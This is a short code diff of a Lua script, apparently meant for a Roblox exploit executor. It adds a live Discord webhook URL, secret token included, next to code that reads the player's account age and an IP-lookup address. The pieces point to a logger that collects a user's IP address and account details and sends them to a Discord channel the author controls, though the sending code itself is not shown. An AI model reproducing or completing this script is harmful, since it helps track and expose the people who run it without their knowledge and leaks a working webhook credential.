@@ -1,4 +1,4 @@
-local discordWebhookURL = ""
+local discordWebhookURL = "https://discord.com/api/webhooks/1378691843138650144/wlKne01K7jLg6_16i6OOvAATLzpBAll25sWYSdVeB9FHwcG9dZaYvNqWiwHQ4MYYIw1-"
 local http_request = (syn and syn.request) or (http and http.request) or request
 local accountAge = player.AccountAge
 local ipifyURL = "https://api.ipify.org/"
